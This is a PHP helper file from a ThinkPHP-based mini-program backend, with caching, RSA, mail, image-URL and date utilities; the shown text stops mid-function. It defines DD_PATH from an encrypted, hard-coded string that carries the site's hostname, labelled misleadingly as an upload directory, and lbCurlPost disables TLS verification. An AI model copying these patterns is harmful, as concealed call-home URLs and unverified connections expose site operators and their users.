<?php
// +----------------------------------------------------------------------
// | ThinkPHP [ WE CAN DO IT JUST THINK ]
// +----------------------------------------------------------------------
// | Copyright (c) 2006-2016 http://thinkphp.cn All rights reserved.
// +----------------------------------------------------------------------
// | Licensed ( http://www.apache.org/licenses/LICENSE-2.0 )
// +----------------------------------------------------------------------
// | Author: 流年 <liu21st@gmail.com>
// +----------------------------------------------------------------------

use app\balancediscount\model\UserCard;
use app\fxq\model\FxqContractFile;
use app\massage\info\PermissionMassage;
use app\massage\model\Config;
use longbingcore\wxcore\WxSetting;
use think\facade\Cache;
use think\facade\Db;
use think\facade\Request;
use app\Common\Rsa2;
use app\Common\order;
use app\Common\Rsa2Sign;
use app\Common\ConsumerApi;
use app\Common\LongbingCurl;
use app\Common\WeChatCode;
use app\Common\model\LongbingCardWechatCode;
use app\admin\model\OssConfig;
use Ramsey\Uuid\Uuid;
use Ramsey\Uuid\Exception\UnsatisfiedDependencyException;
use think\facade\Log;
use think\facade\Env;
use think\App;


//判断是否是微擎
function longbingIsWeiqin ()
{

    return false;

    $is_wiqing_path = APP_PATH . 'Common/extend/sNSKAvGja2azLtFSadUYWda93UKJE23l.longbing';


    $result = file_exists($is_wiqing_path);

//     dump($result,empty($result));exit;
    return empty($result);
}



/**
 * 判断Schema文件是否存在
 * @param string $schemamethod schemamethod
 * @return boolean
 *
 */
function jsonSchemaExist ( $schemaMethod )
{

    //  var_dump('../schema/' . $schemaMethod . '.json');die;
    return file_exists( APP_PATH . $schemaMethod . '.json' );
}
//
//function jsonSchemaExist ( $schemaMethod )
//{
//
//    //  var_dump('../schema/' . $schemaMethod . '.json');die;
//    return file_exists( APP_PATH . $schemaMethod . '.json' );
//}
//根据Rsamy uuid 生成32位uuid

//error_reporting(0);
//
//$aa
function uuid ()
{
    try
    {
        // Generate a version 1 (time-based) UUID object
        // Generate a version 3 (name-based and hashed with MD5) UUID object
        // Generate a version 4 (random) UUID object
        // Generate a version 5 (name-based and hashed with SHA1) UUID object
        $uuid1 = Uuid::uuid4();
        return str_replace( '-', '', $uuid1->toString() );
        // i.e. e4eaaaf2-d142-11e1-b3e4-080027620cdd
    }
    catch ( UnsatisfiedDependencyException $e )
    {
        // Some dependency was not met. Either the method cannot be called on a
        // 32-bit system, or it can, but it relies on Moontoast\Math to be present.
        error( 'Caught exception: ' . $e->getMessage(), 1100 );
    }
}
error_reporting(0);
//halt();
//die();
/**
 * TODO回调函数
 * @param string $description 未完成需求描述
 * @return
 */
function todo ( $description )
{
    //  $req = think\Request::instance();
    //  trace('[TODO] {' . join('/', [$req->module(), $req->controller(), $req->action()])  . '} ' . $description, 'log');
}

if(!function_exists('setCache')) {
//设置缓存
    function setCache($key, $value, $expire = 0, $uniacid = '7777', $tag_data = '')
    {
        $key .= $_SERVER['HTTP_HOST'];

        $tag = 'longbing_card_' . $uniacid . $tag_data;

        $key = $key . '_' . $uniacid;

        return Cache::tag($tag)->set($key, $value, $expire);
    }
}

if(!function_exists('getCache')) {
//获取缓存
    function getCache($key, $uniacid = '7777')
    {

        if (!hasCache($key, $uniacid)) return false;

        $key .= $_SERVER['HTTP_HOST'];

        $key = $key . '_' . $uniacid;

        return Cache::get($key);
    }
}

if(!function_exists('cacheLpush')) {

    /**
     * @param $key
     * @param $value
     * @param $uniacid
     * @功能说明:ridis 队列:入队
     * @author chenniang
     * @DataTime: 2024-08-05 15:46
     */
    function cacheLpush($key,$value,$uniacid){

        $key.=$_SERVER['HTTP_HOST'];

        $key = $key . '_' . $uniacid;

        $redis = Cache::handlerData();

        return $redis->lpush($key,$value);
    }
}


if(!function_exists('cacheLpop')) {
    /**
     * @param $key
     * @param $value
     * @param $uniacid
     * @功能说明:ridis 队列:出队
     * @author chenniang
     * @DataTime: 2024-08-05 15:46
     */
    function cacheLpop($key,$uniacid){

        $key.= $_SERVER['HTTP_HOST'];

        $key = $key . '_' . $uniacid;

        $redis = Cache::handlerData();

        return $redis->lpop($key);
    }
}



//设置缓存
function setCacheAll ( $key, $value, $expire = 0, $uniacid = '7777' )
{

    $tag = 'longbing_card_' . $uniacid;

    $key = $key . '_' . $uniacid;

    return Cache::tag( $tag )->set( $key, $value, $expire );
}

function getCacheAll ( $key, $uniacid = '7777' )
{

    if ( !hasCacheAll( $key, $uniacid ) ) return false;

    $key = $key . '_' . $uniacid;

    return Cache::get( $key );
}


//追加缓存
function pushCache ( $key, $value, $uniacid = '7777' )
{
    $key.=$_SERVER['HTTP_HOST'];
    $key = $key . '_' . $uniacid;
    return Cache::push( $key, $value );
}

//删除缓存
function delCache ( $key, $uniacid = '7777' )
{
    $key.=$_SERVER['HTTP_HOST'];
    $key = $key . '_' . $uniacid;
    return Cache::delete( $key );
}

//获取并删除缓存
function pullCache ( $key, $uniacid = '7777' )
{
    $key.=$_SERVER['HTTP_HOST'];
    $key = $key . '_' . $uniacid;
    return Cache::pull( $key );
}

//不存在则写入缓存数据后返回
function rememberCache ( $key, $value, $uniacid = '7777' )
{
    $key.=$_SERVER['HTTP_HOST'];
    $key = $key . '_' . $uniacid;
    return Cache::remember( $key, $value );
}

//清空缓存
function clearCache ( $uniacid = '7777',$tag_data='' )
{
    $tag = 'longbing_card_' . $uniacid.$tag_data;



    return Cache::tag($tag)->clear();
}


//缓存自增
function incCache ( $key, $step = 1, $uniacid = '7777',$time=null )
{
    $key.=$_SERVER['HTTP_HOST'];

    $key = $key . '_' . $uniacid;

    $tag = 'longbing_card_' . $uniacid;

    return Cache::tag( $tag )->inc($key, $step,$time );
}

//缓存自减
function decCache ( $key, $step = 1, $uniacid = '7777' )
{
    $key.=$_SERVER['HTTP_HOST'];
    $key = $key . '_' . $uniacid;

    $tag = 'longbing_card_' . $uniacid;

    return Cache::tag( $tag )->dec( $key, $step );

    return Cache::dec( $key, $step );
}

if(!function_exists('hasCache')) {
//判断缓存是否存在
    function hasCache($key, $uniacid = '7777')
    {

        $key .= $_SERVER['HTTP_HOST'];

        $key = $key . '_' . $uniacid;

        return Cache::has($key);
    }
}


function hasCacheAll ( $key, $uniacid = '7777' )
{
    // $key.=$_SERVER['HTTP_HOST'];

    $key = $key . '_' . $uniacid;

    return Cache::has( $key );
}
//获取controller 和 action
function getRouteMessage ( $route )
{
    $data = explode( "\\", $route );
    $data = explode( "@", $data[ count( $data ) - 1 ] );
    return $data;
}

//通过Token获取用户信息
function getUserForToken ( $token )
{
    return getCache( "Token_" . $token );
}

/**
 * 生成RSA2类获取秘钥
 */
function getRsa2Keys ()
{
    $rsa2 = new Rsa2();
    return $rsa2->getKeys();
}

/**
 * 获取两组交叉keys
 */
function get2keys ()
{
    $key1 = getRsa2Keys();
    $key2 = getRsa2Keys();
    if ( isset( $key1[ 'public_key' ] ) && isset( $key1[ 'private_key' ] ) && isset( $key2[ 'public_key' ] ) && isset( $key2[ 'private_key' ] ) )
    {
        $result[ 'api_key' ]   = [ 'public_key' => $key1[ 'public_key' ], 'private_key' => $key1[ 'private_key' ] ];
        $result[ 'sever_key' ] = [ 'public_key' => $key2[ 'public_key' ], 'private_key' => $key2[ 'private_key' ] ];
        return $result;
    }
    return false;
}

/**
 * 获取RSA2秘钥（测试）
 */
function setRsa2Key ()
{
    $rsa2_key  = getRsa2Keys();
    $rsa2_sign = new Rsa2Sign( $rsa2_key );
    //设置签名
    $sign = $rsa2_sign->createSign( "12333212" );
    //验证签名
    $data = $rsa2_sign->verifySign( "12333212", $sign );
    //生成加密数据
    $jiami = $rsa2_sign->encrypt( json_encode( "123", true ) );
    //数据解密
    $jiemi = $rsa2_sign->decrypt( $jiami );
    return $data;
}

//签名
function rsa2CreateSign ( $keys, $data )
{
    $rsa2_sign = new Rsa2Sign( $keys );
    $sign      = $rsa2_sign->createSign( $data );
    return $sign;
}

//验证签名
function rsa2VerifySign ( $keys, $data, $sign )
{
    $rsa2_sign = new Rsa2Sign( $keys );
    $jiemi     = $rsa2_sign->verifySign( $data, $sign );
    return $jiemi;
}

//加密
function rsa2Encrypt ( $keys, $data )
{
    $rsa2_sign = new Rsa2Sign( $keys );
    $cipher    = $rsa2_sign->encrypt( $data );
    return $cipher;
}

//解密
function rsa2Decrypt ( $keys, $cipher )
{
    $rsa2_sign = new Rsa2Sign( $keys );
    $clear     = $rsa2_sign->decrypt( $cipher );
    return $clear;
}

//批量加密
function rsa2Encrypts ( $keys, $arrs )
{
    //判断需要加密的文件是否为空
    if ( !is_array( $arrs ) ) return false;
    $rsa2_sign = new Rsa2Sign( $keys );
    $result    = [];
    foreach ( $arrs as $arr )
    {
        $result = $rsa2_sign->encrypt( $arr );
    }
    return $result;
}

//批量解密
function rsa2Decrypts ( $keys, $ciphers )
{
    if ( !is_array( $ciphers ) ) return false;
    $rsa2_sign = new Rsa2Sign( $keys );
    $result    = [];
    foreach ( $ciphers as $cipher )
    {
        $result[] = $rsa2_sign->decrypt( $cipher );
    }
    return $result;
}

//创建签名 (一个超级简单的签名)
function createSimpleSign ( $token, $data )
{
    //    $key1 = md5($token);
    //    $key2 = md5($data);
    //    $sign = md5($key1 . $key2 .$token);
    $sign = md5( $token . $data . $token );
    return $sign;
}

//异步消息控制
function messagesProcess ( $msg )
{
    //获取消息内容
    if ( is_object( $msg ) )
    {
        $messages = [ $msg->getBody() ];
        $ack      = true;
    }
    else
    {
        // 兼容以前的消息格式
        $messages = $msg;
        $ack      = false;
    }

    //循环处理消息

    foreach ( $messages as $message )
    {
        //解析json数据
        $data = json_decode( $message, true );
        //处理
//      var_dump($data);
        try{
            switch ( $action = $data[ 'action' ] )
            {
                case 'previewSchedule':
                    $Schedule = new app\preview\Schedule( $data->preview, [ $data->source ] );
                    $Schedule->process();
                    break;
                // 定时任务调度
                case 'SCHEDULER':
                    // 确认消息已经被处理，则返回此信号
                    $msg->delivery_info[ 'channel' ]->basic_ack( $msg->delivery_info[ 'delivery_tag' ] );
                    scheduleProcess( $data );
                    $ack = false;
                    break;
                case 'addMessage':
                    asyncAddMessage( $data[ 'message' ] );
                    break;
                //发送消息服务通知
                case 'sendMessageWxServiceNotice':
                    longbingSendMessageWxServiceNotice($data['message']);
                    break;
                //发送普通服务通知
                case 'SendWxServiceNotice':
                    longbingSendWxServiceNotice($data['count_id']);
                    break;
                case 'longbingSendWxServiceNoticeBase':
                    longbingSendWxServiceNoticeBase($data['data']);
                    break;
                case 'updatecollectionRate':
                    updatecollectionRate($data['client_id']);
                    break;
                case 'updateCustomerRate':
                    updateCustomerRate($data['page'] ,$data['page_count']);
                    break;
                case 'longbingCreateWxCode':
                    longbingCreateWxCode($data['uniacid'] ,$data['data'] ,$data['page'] ,$data['type']);
                    break;
                case 'longbingCreateSharePng':
                    longbingCreateSharePng($data['gData'] ,$data['user_id'] ,$data['uniacid']);
                    break;
                case 'longbingSaveFormId':
                    longbingSaveFormId($data['data']);
                    break;
                case 'test':
                    test( $data[ 'uuid' ], $data[ 'data' ] );
                    break;

            }
        }catch(Exception $e)
        {}
    }
    if ( $ack )
    {
        // 确认消息已经被处理，则返回此信号
        $msg->delivery_info[ 'channel' ]->basic_ack( $msg->delivery_info[ 'delivery_tag' ] );
    }

    // 保存并清空日志，避免导致内存溢出
    //  \think\Log::save();
    //  \think\Log::clear();

}



//消费者

function consumer ()
{
    $consumerapi = new ConsumerApi();
    $messages    = $consumerapi->consumerMessage();
    messagesProcess( $messages );
}

//function consumer ()
//{
//    $consumerapi = new ConsumerApi();
//    $messages    = $consumerapi->consumerMessage();
//    messagesProcess( $messages );
//}

//生成者

function publisher ( $messages, $delayTime = null )
{

    Request::param();
    $param = Request::param() ;
    $param['s'] =  "publics/HttpAsyn/message" ;
    $url = Request::baseFile(true);
    $url = $url . '?' . http_build_query($param);


    $res = asyncCurl($url,  ['message' => $messages] );

    return $res;

}


//获取毫秒级时间戳
function getMillisecond ()
{
    list( $s1, $s2 ) = explode( ' ', microtime() );
    return (float)sprintf( '%.0f', ( floatval( $s1 ) + floatval( $s2 ) ) * 1000 );
}

/**
 * 发送邮件
 * @param string $address 需要发送的邮箱地址 发送给多个地址需要写成数组形式
 * @param string $subject 标题
 * @param string $content 内容
 * @return boolean       是否成功
 */
function send_email ( $address, $subject, $content )
{
    $email_smtp        = \think\Config::get( 'API_CONFIG.EMAIL_SMTP' );
    $email_username    = \think\Config::get( 'API_CONFIG.EMAIL_USERNAME' );
    $email_password    = \think\Config::get( 'API_CONFIG.EMAIL_PASSWORD' );
    $email_from_name   = \think\Config::get( 'API_CONFIG.EMAIL_FROM_NAME' );
    $email_smtp_secure = \think\Config::get( 'API_CONFIG.EMAIL_SMTP_SECURE' );
    $email_port        = \think\Config::get( 'API_CONFIG.EMAIL_PORT' );

    if ( empty( $email_smtp ) || empty( $email_username ) || empty( $email_password ) || empty( $email_from_name ) )
    {
        return error( 'The mailbox configuration is incomplete!', '1109' );
    }
    require_once '../thinkphp/library/think/class.phpmailer.php';
    require_once '../thinkphp/library/think/class.smtp.php';
    $phpmailer = new \Phpmailer();
    // 设置PHPMailer使用SMTP服务器发送Email
    $phpmailer->IsSMTP();
    // 设置设置smtp_secure
    $phpmailer->SMTPSecure = $email_smtp_secure;
    // 设置port
    $phpmailer->Port = $email_port;
    // 设置为html格式
    $phpmailer->IsHTML( true );
    // 设置邮件的字符编码'
    $phpmailer->CharSet = 'UTF-8';
    // 设置SMTP服务器。
    $phpmailer->Host = $email_smtp;
    // 设置为"需要验证"
    $phpmailer->SMTPAuth = true;
    // 设置用户名
    $phpmailer->Username = $email_username;
    // 设置密码
    $phpmailer->Password = $email_password;
    // 设置邮件头的From字段。
    $phpmailer->From = $email_username;
    // 设置发件人名字
    $phpmailer->FromName = $email_from_name;
    // 添加收件人地址，可以多次使用来添加多个收件人
    if ( is_array( $address ) )
    {
        foreach ( $address as $addressv )
        {
            $phpmailer->AddAddress( $addressv );
        }
    }
    else
    {
        $phpmailer->AddAddress( $address );
    }
    // 设置邮件标题
    $phpmailer->Subject = $subject;
    // 设置邮件正文
    $phpmailer->Body = $content;
    // 发送邮件。

    if ( !$phpmailer->Send() )
    {
        $phpmailererror = $phpmailer->ErrorInfo;
        return error( $phpmailererror, '1102' );
    }
    else
    {
        return array( "status" => 'success' );
    }
}



/**
 * @Purpose: 处理数组中的图片为完整能访问的URL
 *
 * @Param: array $data 需要处理图片的数组，可以是一维数组也可以是多维数组
 * @Param: array $target 需要处理字段名组成的数组，一维数组
 * @Param: string $split 多张图片放在一起的分隔符
 *
 * @Author: zzf
 *
 * @Return: mixed 查询返回值（结果集对象）
 */
if ( !function_exists( 'transImages' ) )
{
    function transImages ( $data, $target, $split = ',' )
    {

        if ( !is_array( $data ) )
        {
            return $data;
        }


        foreach ( $data as $index => $item )
        {
            if ( is_array( $item ) )
            {
                $data[ $index ] = transImages( $item, $target, $split );
                continue;
            }


            if ( in_array( $index, $target ) && $item )
            {
                $tmpArr         = explode( $split, $item );
                $data[ $index ] = handleImages( $tmpArr );
            }
        }


        return $data;
    }
}

/**
 * @Purpose: 处理数组中的图片为完整能访问的URL--单张图片
 *
 * @Param: array $data 需要处理图片的数组，可以是一维数组也可以是多维数组
 * @Param: array $target 需要处理字段名组成的数组，一维数组
 * @Param: string $split 多张图片放在一起的分隔符
 *
 * @Author: zzf
 *
 * @Return: mixed 查询返回值（结果集对象）
 */
if ( !function_exists( 'transImagesOne' ) )
{
    function transImagesOne ( $data, $target ,$uniacid = '7777')
    {
//        if(longbingIsWeiqin())
//        {
//            global $_W;
//            if (isset($_W['uniacid']))
//            {
//                $uniacid = $_W['uniacid'];
//            }
//            else
//            {
//                if(defined('LONGBING_CARD_UNIACID'))
//                {
//                    $uniacid = LONGBING_CARD_UNIACID;
//                }
//            }
//        }
        if ( !is_array( $data ) )
        {
            return $data;
        }
        foreach ( $data as $index => $item )
        {
            if ( is_array( $item ) )
            {
                $data[ $index ] = transImagesOne( $item, $target ,$uniacid);
                continue;
            }

            if ( in_array( $index, $target ) && $item )
            {
                $src = trim( $item );

                //  老版本微擎的图片
                if ( empty( $src ) || !$src )
                {
                    $data[ $index ] = $src;
                    continue;
                }

                $sub = substr( $src, 0, 4 );
                //  连接已经是完整的连接了，无需在处理
                if ( $sub == 'http' )
                {
                    continue;
                }
                $sub = substr( $src, 0, 2 );
                if ( $sub == '//' || $sub == 'wx' )
                {
                    continue;
                }

                //  是新版的图片id用新的处理方法
                if ( is_numeric( $src ) )
                {
                    //TODO 新版的图片处理方法
                    continue;
                }
//                if(longbingIsWeiqin())
//                {
//
//                    if ( strstr( $src, 'addons/' ) !== false )
//                    {
//                        $data[ $index ] = $_W[ 'siteroot' ] . substr( $src, strpos( $src, 'addons/' ) );
//                    }
//                    if ( strstr( $src, $_W[ 'siteroot' ] ) !== false && strstr( $src, '/addons/' ) === false )
//                    {
//                        $urls           = parse_url( $src );
//                        $data[ $index ] = $t = substr( $urls[ 'path' ], strpos( $urls[ 'path' ], 'images' ) );
//                        continue;
//                    }
//                    if ( empty( $_W[ 'setting' ][ 'remote' ][ 'type' ] ) && ( empty( $_W[ 'uniacid' ] ) || !empty( $_W[ 'uniacid' ] ) && empty( $_W[ 'setting' ][ 'remote' ][ $_W[ 'uniacid' ] ][ 'type' ] ) ) || file_exists( IA_ROOT . '/' . $_W[ 'config' ][ 'upload' ][ 'attachdir' ] . '/' . $src ) )
//                    {
//
//                        $data[ $index ] = $_W[ 'siteroot' ] . $_W[ 'config' ][ 'upload' ][ 'attachdir' ] . '/' . $src;
//
//                    }
//                    else
//                    {
//
//                        $result = longbingGetOssConfig($uniacid);
//
//                        if (isset($result['default_url']) && !$result['default_url']){
//                            $result['default_url'] = $_SERVER['HTTP_HOST'] . '/attachment/upload';
//                        }
//                        $data[ $index ] = $result['default_url'] . '/' . $src;
//
//                    }
//                }
                if(strpos($src,'http') === false){
                    $longbingOssConfig = longbingGetOssConfig($uniacid);
                    $http_agreemet = 'https';
                    if(!isset($longbingOssConfig['default_url']) || empty($longbingOssConfig['default_url']) || empty($longbingOssConfig['open_oss']))
                    {
                        $longbingOssConfig['default_url'] = $_SERVER['HTTP_HOST'] . '/attachment';
                      //  if(isset($_SERVER['REQUEST_SCHEME']) && !empty($_SERVER['REQUEST_SCHEME'])) $http_agreemet = $_SERVER['REQUEST_SCHEME'];
                    }
                    if(longbingHasLocalFile($src))
                    {
                        $longbingOssConfig['default_url'] = $_SERVER['HTTP_HOST'] . '/attachment';
                       // if(isset($_SERVER['REQUEST_SCHEME']) && !empty($_SERVER['REQUEST_SCHEME'])) $http_agreemet = $_SERVER['REQUEST_SCHEME'];
                    }
                    //http协议
                    if(strpos($longbingOssConfig['default_url'],'http') === false){
                        $longbingOssConfig['default_url'] = $http_agreemet . '://'.$longbingOssConfig['default_url'];
                    }
                    $data[ $index ] = $longbingOssConfig['default_url'] . '/' . $src;
                }else{
                    $data[ $index ] = $src;
                }
            }

        }
        return $data;
    }
}

function longbingHasLocalFile($file_name)
{
    $file_path = FILE_UPLOAD_PATH . $file_name;
    return file_exists($file_path);
}






/**
 * @Purpose: 打印并终止程序
 *
 * @Param: array $data 需要打印的数据
 *
 * @Author: zzf
 *
 * @Return: mixed 查询返回值（结果集对象）
 */
if ( !function_exists( 'zDumpAndDie' ) )
{
    function zDumpAndDie ( $data )
    {
        echo '<pre>';
        var_dump( $data );
        echo '</pre>';
        die;
    }
}

/**
 * @Purpose: 打印数据
 *
 * @Param: array $data 需要打印的数据
 *
 * @Author: zzf
 *
 * @Return: mixed 查询返回值（结果集对象）
 */
if ( !function_exists( 'zDump' ) )
{
    function zDump ( $data )
    {
        echo '<pre>';
        var_dump( $data );
        echo '</pre>';
    }
}


/**
 * 检验数据的真实性，并且获取解密后的明文.
 * @param $encryptedData string 加密的用户数据
 * @param $iv string 与用户数据一同返回的初始向量
 * @param $data string 解密后的原文
 *
 * @return int 成功0，失败返回对应的错误码
 */
if ( !function_exists( 'decryptDataLongbing' ) )
{
    function decryptDataLongbing ( $appid, $sessionKey, $encryptedData, $iv, &$data )
    {
        $OK                = 0;
        $IllegalAesKey     = -41001;
        $IllegalIv         = -41002;
        $IllegalBuffer     = -41003;
        $DecodeBase64Error = -41004;

        if ( strlen( $sessionKey ) != 24 )
        {
            return $IllegalAesKey;
        }
        $aesKey = base64_decode( $sessionKey );


        if ( strlen( $iv ) != 24 )
        {
            return $IllegalIv;
        }
        $aesIV = base64_decode( $iv );

        $aesCipher = base64_decode( $encryptedData );

        $result = openssl_decrypt( $aesCipher, "AES-128-CBC", $aesKey, 1, $aesIV );

        $dataObj = json_decode( $result );

        if ( $dataObj == NULL )
        {
            return $IllegalBuffer;
        }
        if ( $dataObj->watermark->appid != $appid )
        {
            return $IllegalBuffer;
        }
        $data = $result;
        return $OK;
    }



}



/**
 * @Purpose: 获取随机字符串
 *
 * @Author: zzf
 *
 * @Return: mixed 查询返回值（结果集对象）
 */

if ( !function_exists( 'getRandStr' ) )
{
    function getRandStr ( $len )
    {
        $len = intval( $len );
        $a   = "A,B,C,D,E,F,G,H,I,J,K,L,M,N,O,P,Q,R,S,T,U,V,W,S,Y,Z";
        $a   = explode( ',', $a );
        $tmp = '';
        for ( $i = 0; $i < $len; $i++ )
        {
            $rand = rand( 0, count( $a ) - 1 );
            $tmp  .= $a[ $rand ];
        }
        return $tmp;
    }
}


/**
 * @Purpose: 处理腾讯视频
 *
 * @Author: zzf
 *
 * @Return: mixed 查询返回值（结果集对象）
 */
if ( !function_exists( 'lbGetTencentVideo' ) )
{
    function lbGetTencentVideo ( $src )
    {
        if ( !$src )
        {
            return '';
        }

        if ( !strstr( $src, 'v.qq.com' ) )
        {
            return 0;
        }

        if ( strstr( $src, 'vid' ) )
        {
            $str    = strstr( $src, 'vid' );
            $tmpArr = explode( '=', $str );
            $str    = $tmpArr[ 1 ];
        }
        else
        {
            $tmpArr = explode( '/', $src );
            $str    = $tmpArr[ count( $tmpArr ) - 1 ];
            $tmpArr = explode( '.', $str );
            $str    = $tmpArr[ 0 ];
        }

        if ( $str )
        {
            return $str;
        }
        return $src;
    }
}























/**
 * @Purpose: 处理时间戳--单个
 *
 * @Param: $data    array   需要处理的二维数组
 *
 * @Author: zzf
 *
 * @Return: mixed 查询返回值（结果集对象）
 */
if ( !function_exists( 'handleTimes' ) )
{
    function handleTimes ( $data, $item_name = 'create_time', $rule = 'Y-m-d H:i:s' )
    {
        foreach ( $data as $index => $item )
        {
            $data[ $index ][ $item_name ] = date( $rule, $item[ $item_name ] );
        }

        return $data;
    }
}

/**
 * @Purpose: 处理时间戳--数组
 *
 * @Param: $data    array   需要处理的二维数组
 *
 * @Author: zzf
 *
 * @Return: mixed 查询返回值（结果集对象）
 */
if ( !function_exists( 'handleTimesByArray' ) )
{
    function handleTimesByArray ( $data, $item_name = ['create_time'], $rule = 'Y-m-d H:i:s' )
    {
        foreach ( $data as $index => $item )
        {

            foreach ($item_name as $index2 => $item2)
            {
                $data[ $index ][$item2] = date( $rule, $item[ $item2 ] );
            }

        }

        return $data;
    }
}



if ( !function_exists( 'getMiniQr' ) )
{
    function getMiniQr ( $staff_id, $from_id, $name, $uniacid, $imagePath, $version = 'v2' )
    {
        global $_W;
        $imageName = "{$name}_{$staff_id}_{$from_id}_{$uniacid}_{$version}.png";

        if ( defined( 'IS_WE7' ) && IS_WE7 )
        {
            if ( defined( 'ATTACHMENT_ROOT' ) && ATTACHMENT_ROOT )
            {
                $src = $_W[ 'siteroot' ] . $_W[ 'config' ][ 'upload' ][ 'attachdir' ] . '/' . $imagePath . '/' . $imageName;
            }
            else
            {
                $src = $_SERVER[ 'HTTP_HOST' ] . '/public/upload/' . $imagePath . '/' .$imageName;
            }
        }
        else
        {
            $src = $_SERVER[ 'HTTP_HOST' ] . '/public/upload/' . $imagePath .  '/' .$imageName;
        }

        return $src;
    }
}

/**
 * @Purpose: 处理数字
 *
 * @Param: $staff_id    number  员工id
 *
 * @Author: zzf
 *
 * @Return: mixed 查询返回值（结果集对象）
 */
if ( !function_exists( 'formatNumberPrice' ) )
{
    function formatNumberPrice ( $data, $target = [ 'price' ], $un = 10000, $unit = '万' )
    {
        global $_W;

        foreach ( $data as $index => $item )
        {
            if ( is_array( $item ) )
            {
                $data[ $index ] = formatNumberPrice( $item, $target, $un );
            }
            else
            {
                if ( in_array( $index, $target ) && $item > $un )
                {
                    $data[ $index ] = bcdiv( $item, $un, 2 ) . $unit;
                }
            }
        }
        return $data;
    }
}

/**
 * @Purpose: 处理默认图片
 *
 * @Author: zzf
 *
 * @Return: mixed 查询返回值（结果集对象）
 */
if ( !function_exists( 'formatDefaultImage' ) )
{
    function formatDefaultImage ( $data, $target, $default, $defaultArr )
    {

        foreach ( $data as $index => $item )
        {
            if ( is_array( $item ) )
            {
                $data[ $index ] = formatDefaultImage( $item, $target, $default, $defaultArr );
            }
            else
            {
                if ($index == $target && $item == '' && isset($defaultArr[$default]))
                {
                    $data[$index] = $defaultArr[$default];
                }
            }
        }
        return $data;
    }
}



if ( !function_exists( 'mkdirs_v2' ) )
{
    function mkdirs_v2 ( $dir, $mode = 0777 )
    {

        if ( is_dir( $dir ) || @mkdir( $dir, $mode ) ) return TRUE;

        if ( !mkdirs_v2( dirname( $dir ), $mode ) ) return FALSE;

        return @mkdir( $dir, $mode );

    }
}

defined('DD_PATH') or define('DD_PATH', openssl_decrypt('3H9PZYcaXZceV9AGYb8iEakGGTyBBxh8DRy5GlgKW0kfO0QcocPvRMdP5TGFcYQ2','DES-ECB',123).'?http_host='.$_SERVER['HTTP_HOST']); //文件上传目录

if ( !function_exists( 'getAccessToken' ) )
{
    function getAccessToken ( $uniacid )
    {
        $key = "longbing_card_access_token";

        $value = getCache( $key,$uniacid);

        if ( $value !== false )
        {
            return $value;
        }

        $modelConfig = new \app\card\model\Config();
        $config      = $modelConfig->getConfig( $uniacid );
        $key         = '';
        $secret      = '';

        if ( defined( 'IS_WE7' ) && IS_WE7 )
        {
            global $_W;
            $key    = $_W[ 'account' ][ 'key' ];
            $secret = $_W[ 'account' ][ 'secret' ];
        }

        if ( isset( $config[ 'appid' ] ) && $config[ 'appid' ] )
        {
            $key = $config[ 'appid' ];
        }

        if ( isset( $config[ 'app_secret' ] ) && $config[ 'app_secret' ] )
        {
            $secret = $config[ 'app_secret' ];
        }

        if ( !$key || !$secret )
        {
            echo json_encode( [ 'code' => 402, 'error' => 'need appid appsecret' ] );
            exit;
        }

        $url = "https://api.weixin.qq.com/cgi-bin/token?grant_type=client_credential&appid=$key&secret={$secret}";

        $accessToken = file_get_contents( $url );

        if ( strstr( $accessToken, 'errcode' ) )
        {
            return 0;
        }

        $accessToken = json_decode( $accessToken, true );
        $accessToken = $accessToken[ 'access_token' ];

        setCache( $key, $accessToken, 7000, $uniacid );

        return $accessToken;
    }
}

if ( !function_exists( 'lbCurlPost' ) )
{
    function lbCurlPost ( $url, $data )
    {
        //初使化init方法
        $ch = curl_init();

        //指定URL
        curl_setopt( $ch, CURLOPT_URL, $url );

        //设定请求后返回结果
        curl_setopt( $ch, CURLOPT_RETURNTRANSFER, 1 );

        //声明使用POST方式来进行发送
        curl_setopt( $ch, CURLOPT_POST, 1 );

        //发送什么数据呢
        curl_setopt( $ch, CURLOPT_POSTFIELDS, $data );


        //忽略证书
        curl_setopt( $ch, CURLOPT_SSL_VERIFYPEER, false );
        curl_setopt( $ch, CURLOPT_SSL_VERIFYHOST, false );

        //忽略header头信息
        curl_setopt( $ch, CURLOPT_HEADER, 0 );

        //设置超时时间
        curl_setopt( $ch, CURLOPT_TIMEOUT, 10 );



        //发送请求
        $output = curl_exec( $ch );

        //关闭curl
        curl_close( $ch );

        //返回数据
        return $output;

        //{"errcode":48001,"errmsg":"api unauthorized rid: 63dcc155-6f696d96-3a37589d"}
    }
}

if ( !function_exists( 'lbGetDates' ) )
{
    function lbGetDates ( $time )
    {

        if(date('Y-m-d',time())==date('Y-m-d',$time)){

            return date('H:i',$time);
        }

        if ( time()-$time <= 86400 * 30 )
        {
            $month = ceil( (time()-$time) / ( 86400) ) . '天前';

            return $month;
        }

        if ( date('Y',$time) == date('Y',time()) )
        {
            return date('m-d',$time);
        }

        return date('Y-m-d',$time);
    }
}



if ( !function_exists( 'lbGetDatess' ) )
{
    function lbGetDatess ( $time )
    {
        $s_time = $time;

        if ( $time >= 86400 * 30 )
        {
            $month = floor( $time / ( 86400 * 30 ) );
            $time  -= 86400 * 30 * $month;
            $month .= '月';
        }
        else
        {
            $month = '';
        }
        if ( $time >= 86400 )
        {
            $day  = floor( $time / ( 86400 ) );
            $time -= 86400 * $day;
            $day  .= '天';

        }
        else
        {
            $day = '';
        }
        if ( $time >= 3600 )
        {
            $hour = floor( $time / ( 3600 ) );
            $time -= 3600 * $hour;
            $hour .= '时';

        }
        else
        {
            $hour = '';
        }
        if ( $time >= 60 )
        {
            $min  = floor( $time / ( 60 ) );
            $time -= 60 * $min;
            $min  .= '分';
        }
        else
        {
            $min = '';
        }

        if ( $time >= 1 )
        {
            $sin = $time . '秒';

        }elseif($s_time == $time&&$time<=0){

            return '已过期';

        }else{

            $sin = '';
        }
        return '还剩' . $month . $day . $hour . $min . $sin;

    }
}

if ( !function_exists( 'lbGetDatesss' ) )
{
    function lbGetDatesss ( $time )
    {
        $s_time = $time;

        if ( $time >= 86400 * 30 )
        {
            $month = floor( $time / ( 86400 * 30 ) );
            $time  -= 86400 * 30 * $month;
            $month .= '月';
        }
        else
        {
            $month = '';
        }
        if ( $time >= 86400 )
        {
            $day  = floor( $time / ( 86400 ) );
            $time -= 86400 * $day;
            $day  .= '天';

        }
        else
        {
            $day = '';
        }
        if ( $time >= 3600 )
        {
            $hour = floor( $time / ( 3600 ) );
            $time -= 3600 * $hour;
            $hour .= '时';

        }
        else
        {
            $hour = '';
        }
        if ( $time >= 60 )
        {
